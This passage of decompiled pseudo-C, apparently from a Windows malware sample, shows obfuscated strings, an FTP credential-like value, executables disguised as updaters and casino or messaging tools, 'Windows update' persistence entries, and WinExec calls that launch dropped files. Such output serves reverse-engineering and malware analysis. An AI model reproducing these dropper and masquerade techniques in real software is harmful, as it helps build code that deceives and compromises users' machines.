    if (BVar3 != 0) {
      pCVar4 = FUN_004044f8(local_8);
      MoveFileA(pCVar4,pCVar2);
    }
  }
  *in_FS_OFFSET = uStack_34;
  *in_FS_OFFSET = local_28;
  puStack_20 = &LAB_00417541;
  puStack_24 = (undefined *)0x417539;
  FUN_00404080((int *)&local_c,2);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0041754c(void)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_10;
  undefined *puStack_c;
  undefined *puStack_8;
  
  puStack_8 = &stack0xfffffffc;
  puStack_c = &LAB_004176cd;
  uStack_10 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_10;
  _DAT_004198fc = _DAT_004198fc + 1;
  if (_DAT_004198fc == 0) {
    FUN_0040405c((int *)&PTR_s___202803s_bat_004184d4);
    FUN_00404a80((int **)&PTR_s_ilyask_1392639195_ftp_user_kz_21_0041845c,PTR_DAT_00401000,0x1e);
    FUN_0040405c((int *)&PTR_s_86c54_32e3c_k54964l_76532_7a54s__00418458);
    FUN_0040405c((int *)&PTR_s_7642u_4p2d1_12432at_e093t_23543__00418454);
    FUN_0040405c((int *)&PTR_s_u432p_21d19_at2376p_r0g5a_8t3x9__00418450);
    FUN_0040405c((int *)&PTR_s_0675i_75e3x_983p32l_or23f_u7dca__0041844c);
    FUN_0040405c((int *)&PTR_s_431n3_23o13_324ti23_9560f_4i0ca__00418448);
    FUN_00404a80((int **)&PTR_DAT_004183e0,PTR_DAT_00401000,0x1a);
    FUN_0040405c((int *)&PTR_s_hsmhzmrfvknhslktmtvhtwsrdrhphs_u_004183dc);
    FUN_0040405c((int *)&PTR_s_hsmhzmrfvknhslktmtvhtwsrdrhphs_u_004183d8);
    FUN_0040405c((int *)&PTR_s_update_programs_txt_004183d4);
    FUN_0040405c((int *)&PTR_s_update_programs_004183d0);
    FUN_0040405c((int *)&PTR_s_iexplorer_updater_exe_004183cc);
    FUN_0040405c((int *)&PTR_s_iexplorer_updater_004183c8);
    FUN_0040405c((int *)&PTR_s_casino_notifications_exe_004183c4);
    FUN_0040405c((int *)&PTR_s_casino_notifications_004183c0);
    FUN_0040405c((int *)&PTR_s_LiveMessageCenter_exe_004183bc);
    FUN_0040405c((int *)&PTR_s_LiveMessageCenter_004183b8);
    FUN_0040405c((int *)&PTR_s_casino_extensions_exe_004183b4);
    FUN_0040405c((int *)&PTR_s_casino_extensions_004183b0);
    FUN_0040405c((int *)&DAT_004198f8);
    FUN_0040405c(&DAT_004198f4);
    FUN_0040405c(&DAT_004198f0);
    FUN_0040405c(&DAT_004198ec);
    FUN_0040405c(&DAT_004198e8);
    FUN_0040405c(&DAT_004198e4);
    FUN_0040405c(&DAT_004198e0);
    FUN_0040405c(&DAT_004198dc);
    FUN_0040405c(&DAT_004198d8);
    FUN_0040405c(&DAT_004198d4);
    FUN_0040405c(&DAT_004198d0);
    FUN_0040405c(&DAT_004198cc);
  }
  *in_FS_OFFSET = uStack_10;
  return;
}



void entry(void)

{
  char cVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  LPCSTR pCVar4;
  int iVar5;
  undefined *unaff_EDI;
  int *in_FS_OFFSET;
  undefined *local_60;
  char *local_5c;
  undefined4 *local_58;
  undefined *local_54;
  char *local_50;
  undefined *local_4c;
  char *local_48;
  undefined4 *local_44;
  undefined *local_40;
  char *in_stack_ffffffc4;
  UINT UVar6;
  undefined *local_34;
  undefined *puVar7;
  undefined *puVar8;
  undefined *puVar9;
  int local_28;
  undefined *local_24;
  char *local_20;
  
  puVar9 = &stack0xfffffffc;
  iVar5 = 0xb;
  do {
    iVar5 = iVar5 + -1;
  } while (iVar5 != 0);
  local_20 = (char *)0x4177c5;
  FUN_00405d78(&DAT_00417708);
  local_24 = &LAB_00417bda;
  local_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int)&local_28;
  local_20 = &stack0xfffffffc;
  FUN_00402a1c();
  FUN_00414424();
  uVar2 = FUN_004154b4();
  switch(uVar2) {
  case 0:
    puVar7 = &LAB_0041792c;
    local_34 = (undefined *)*in_FS_OFFSET;
    *in_FS_OFFSET = (int)&local_34;
    FUN_00417140();
    do {
      puVar8 = puVar9;
      FUN_004029bc(0,(int *)&stack0xffffffe4);
      puVar3 = (undefined4 *)FUN_004044f8(unaff_EDI);
      FUN_00404254((int *)&stack0xffffffe8,puVar3);
      FUN_00404344((int *)&local_24,*(undefined4 **)PTR_DAT_00418518,
                   *(undefined4 **)PTR_PTR_s_casino_extensions_exe_004185ec);
      puVar3 = (undefined4 *)FUN_004044f8(local_24);
      FUN_00404254((int *)&local_20,puVar3);
      FUN_00417470((undefined *)0x417839,local_20);
      FUN_004029bc(0,(int *)&stack0xffffffd4);
      local_20 = s____>_00417c1c;
      local_24 = *(undefined **)PTR_DAT_00418518;
      FUN_004043b8(&local_28,5);
      FUN_00417448();
      FUN_00404344((int *)&stack0xffffffd0,*(undefined4 **)PTR_DAT_00418518,
                   *(undefined4 **)PTR_PTR_s_casino_extensions_exe_004185ec);
      puVar9 = (undefined *)0x4178ca;
      uVar2 = FUN_00407708(puVar7);
      unaff_EDI = puVar8;
    } while ((char)uVar2 == '\0');
    UVar6 = 0;
    FUN_00404344((int *)&local_34,*(undefined4 **)PTR_DAT_00418518,
                 *(undefined4 **)PTR_PTR_s_casino_extensions_exe_004185ec);
    pCVar4 = FUN_004044f8(local_34);
    local_34 = (undefined *)0x4178fa;
    WinExec(pCVar4,UVar6);
    local_34 = *(undefined **)PTR_PTR_s_casino_extensions_exe_004185ec;
    FUN_004043b8((int *)&stack0xffffffc8,3);
    FUN_00417448();
    *in_FS_OFFSET = (int)local_34;
    PostQuitMessage(0);
    break;
  case 1:
    local_34 = (undefined *)*in_FS_OFFSET;
    *in_FS_OFFSET = (int)&local_34;
    cVar1 = FUN_00415248('\x01');
    if (cVar1 == '\0') {
      FUN_00415644();
    }
    else {
      FUN_00416f74();
    }
    cVar1 = FUN_00415380('\x01');
    if (cVar1 == '\0') {
      FUN_004156d4();
    }
    else {
      FUN_00416f74();
    }
    *in_FS_OFFSET = (int)local_34;
    FUN_0041497c(*(undefined **)PTR_DAT_0041863c);
    break;
  case 2:
    local_34 = (undefined *)*in_FS_OFFSET;
    *in_FS_OFFSET = (int)&local_34;
    FUN_00414f38(1,(int *)&local_44);
    FUN_004040b0((int *)PTR_DAT_004185dc,local_44);
    FUN_00404344((int *)&local_48,*(undefined4 **)PTR_DAT_004185b8,*(undefined4 **)PTR_DAT_004185dc)
    ;
    FUN_00416ff4(*(undefined **)PTR_DAT_0041863c,local_48);
    FUN_00404344((int *)&local_4c,*(undefined4 **)PTR_DAT_004185b8,*(undefined4 **)PTR_DAT_004185dc)
    ;
    FUN_004145b8(s_Windows_update1_00417c60,local_4c);
    FUN_0041635c();
    *in_FS_OFFSET = (int)local_34;
    break;
  case 3:
    local_34 = (undefined *)*in_FS_OFFSET;
    *in_FS_OFFSET = (int)&local_34;
    FUN_00414f38(2,(int *)&local_58);
    FUN_004040b0((int *)PTR_DAT_00418604,local_58);
    FUN_00404344((int *)&local_5c,*(undefined4 **)PTR_DAT_004185b8,*(undefined4 **)PTR_DAT_00418604)
    ;
    FUN_00416ff4(*(undefined **)PTR_DAT_0041863c,local_5c);
    FUN_00404344((int *)&local_60,*(undefined4 **)PTR_DAT_004185b8,*(undefined4 **)PTR_DAT_00418604)
    ;
    FUN_004145b8(s_Windows_update2_00417c78,local_60);
    FUN_00416988();
    *in_FS_OFFSET = (int)local_34;
    break;
  case 4:
    local_34 = (undefined *)*in_FS_OFFSET;
    *in_FS_OFFSET = (int)&local_34;
    FUN_00404344((int *)&stack0xffffffc4,*(undefined4 **)PTR_DAT_004185b8,
                 *(undefined4 **)PTR_PTR_s_casino_extensions_exe_004185ec);
    FUN_00416ff4(*(undefined **)PTR_DAT_0041863c,in_stack_ffffffc4);
    UVar6 = 0;
    FUN_00404344((int *)&local_40,*(undefined4 **)PTR_DAT_004185b8,
                 *(undefined4 **)PTR_PTR_s_casino_extensions_exe_004185ec);
    pCVar4 = FUN_004044f8(local_40);
    local_40 = (undefined *)0x417a00;
    WinExec(pCVar4,UVar6);
    *in_FS_OFFSET = (int)local_34;
    PostQuitMessage(0);
    break;
  case 5:
    local_34 = (undefined *)*in_FS_OFFSET;
    *in_FS_OFFSET = (int)&local_34;
    FUN_00404344((int *)&local_50,*(undefined4 **)PTR_DAT_004185b8,
                 *(undefined4 **)PTR_PTR_s_LiveMessageCenter_exe_004186c8);
    FUN_00416ff4(*(undefined **)PTR_DAT_0041863c,local_50);
    UVar6 = 0;
    FUN_00404344((int *)&local_54,*(undefined4 **)PTR_DAT_004185b8,
                 *(undefined4 **)PTR_PTR_s_LiveMessageCenter_exe_004186c8);
    pCVar4 = FUN_004044f8(local_54);
    local_40 = (undefined *)0x417b12;
    WinExec(pCVar4,UVar6);
    *in_FS_OFFSET = (int)local_34;
    PostQuitMessage(0);
  }
  *in_FS_OFFSET = local_28;
  local_20 = &DAT_00417be1;
  local_24 = (undefined *)0x417bd9;
  FUN_00404080((int *)&local_60,0x13);
  return;
}


